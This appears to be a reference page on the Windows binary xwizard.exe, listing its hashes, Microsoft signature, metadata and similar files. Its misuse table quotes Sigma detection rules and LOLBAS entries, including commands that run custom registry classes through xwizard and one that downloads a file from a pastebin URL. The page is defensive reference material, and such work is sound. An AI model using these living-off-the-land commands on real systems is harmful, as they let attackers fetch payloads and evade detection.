---
title: xwizard.exe | Extensible Wizards Host Process
excerpt: What is xwizard.exe?
---

# xwizard.exe 

* File Path: `C:\WINDOWS\SysWOW64\xwizard.exe`
* Description: Extensible Wizards Host Process

## Hashes

Type | Hash
-- | --
MD5 | `CB72CA2B130AA4B776FAF32E18453CF6`
SHA1 | `9B7E63B9B203149434F3399C4F50CF4C90156E14`
SHA256 | `E8C5AB5C641D902D7ED9CBEA6434A218728A7D4A07F7C330975C4F66EC7AE453`
SHA384 | `B8EDF55FD8F599028E6968FC28E6487AD9A1BAC9E5453D94A8C3DFC6F236FB89EF56C0299918B9AFC7010966E036338D`
SHA512 | `4B9F433F4208BB68601469081B577862D9400E1F2586ABD83339C61D62D0109C8D620F365F8ABC2B71460795551B3A3C57E2847DC11A43E3A78C7AFB36E61DF0`
SSDEEP | `1536:iQTiHGLIKWDivTndURDoq4OZZZLlCIib:rTkGsDiLnSRD68wb`

## Signature

* Status: Signature verified.
* Serial: `330000023241FB59996DCC4DFF000000000232`
* Thumbprint: `FF82BC38E1DA5E596DF374C53E3617F7EDA36B06`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: xwizard.exe.mui
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.18362.1 (WinBuild.160101.0800)
* Product Version: 10.0.18362.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.


## File Similarity (ssdeep match)

File | Score
-- | --
[C:\Windows\system32\ComputerDefaults.exe](ComputerDefaults.exe-3F032A1BDF4D7DF2F43FE7C0410AC175.md) | 54
[C:\WINDOWS\system32\ComputerDefaults.exe](ComputerDefaults.exe-495F18535BBBA007A18EC5EE708318FE.md) | 54
[C:\Windows\system32\ComputerDefaults.exe](ComputerDefaults.exe-AC4C3945A3E6DFFF98145096DA4EDA93.md) | 55
[C:\windows\system32\ComputerDefaults.exe](ComputerDefaults.exe-C18B586CA8F414A47D9CBA263361692B.md) | 66
[C:\Windows\system32\ComputerDefaults.exe](ComputerDefaults.exe-D25A9E160E3B74EF2242023726F15416.md) | 47
[C:\Windows\system32\xwizard.exe](xwizard.exe-10B8BDC83EF7CFBBD344F2587453AD29.md) | 52
[C:\windows\system32\xwizard.exe](xwizard.exe-2AFA70B713D8AF4279C9FDAE7AD08A9D.md) | 57
[C:\Windows\system32\xwizard.exe](xwizard.exe-30C784340F42DB44A84C7958C240E394.md) | 47
[C:\WINDOWS\system32\xwizard.exe](xwizard.exe-30D89280E86DFB29C2F232194642125E.md) | 55
[C:\Windows\system32\xwizard.exe](xwizard.exe-C0CCC55F9E988ACB8B624EFD0EC8B92B.md) | 54
[C:\windows\SysWOW64\ComputerDefaults.exe](ComputerDefaults.exe-1A506E36A76AD897490E77313CD3259A.md) | 60
[C:\WINDOWS\SysWOW64\ComputerDefaults.exe](ComputerDefaults.exe-455CCBB47F4BEF02A9E0034859CE59E2.md) | 46
[C:\Windows\SysWOW64\ComputerDefaults.exe](ComputerDefaults.exe-4A007FCF54D0379B75D1FA50F840D62B.md) | 63
[C:\Windows\SysWOW64\ComputerDefaults.exe](ComputerDefaults.exe-CFA65B13918526579371C138108A7DDB.md) | 50
[C:\Windows\SysWOW64\ComputerDefaults.exe](ComputerDefaults.exe-FF2E0EABBB610CD9D4F06C8C0E33B92F.md) | 50
[C:\Windows\SysWOW64\xwizard.exe](xwizard.exe-3C70F039EE4C07511ABD82B5664FB91B.md) | 63
[C:\Windows\SysWOW64\xwizard.exe](xwizard.exe-759CF84292251AB50E1791CBC0C4E8C5.md) | 69
[C:\windows\SysWOW64\xwizard.exe](xwizard.exe-7E421CBAF3DB19860413EC55C5B03F61.md) | 54
[C:\Windows\SysWOW64\xwizard.exe](xwizard.exe-8581F29C5F84B72C053DBCC5372C5DB6.md) | 57

## Possible Misuse

*The following table contains possible examples of `xwizard.exe` being misused. While `xwizard.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [win_class_exec_xwizard.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_class_exec_xwizard.yml) | `title: Custom Class Execution via Xwizard`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_class_exec_xwizard.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_class_exec_xwizard.yml) | `description: Detects the execution of Xwizard tool with specific arguments which utilized to run custom class properties.`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_class_exec_xwizard.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_class_exec_xwizard.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/Xwizard/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_class_exec_xwizard.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_class_exec_xwizard.yml) | `Image\|endswith: '\xwizard.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_dll_sideload_xwizard.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_dll_sideload_xwizard.yml) | `title: Xwizard DLL Sideloading`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_dll_sideload_xwizard.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_dll_sideload_xwizard.yml) | `description: Detects the execution of Xwizard tool from the non-default directory which can be used to sideload a custom xwizards.dll`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_dll_sideload_xwizard.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_dll_sideload_xwizard.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/Xwizard/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_dll_sideload_xwizard.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_dll_sideload_xwizard.yml) | `Image\|endswith: '\xwizard.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `Name: Xwizard.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `- Command: xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `Description: Xwizard.exe running a custom class that has been added to the registry.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `- Command: xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `Description: Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `- Command: xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `Description: Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `- Path: C:\Windows\System32\xwizard.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `- Path: C:\Windows\SysWOW64\xwizard.exe`{:.highlight .language-yaml} | 



MIT License. Copyright (c) 2020-2021 Strontic.


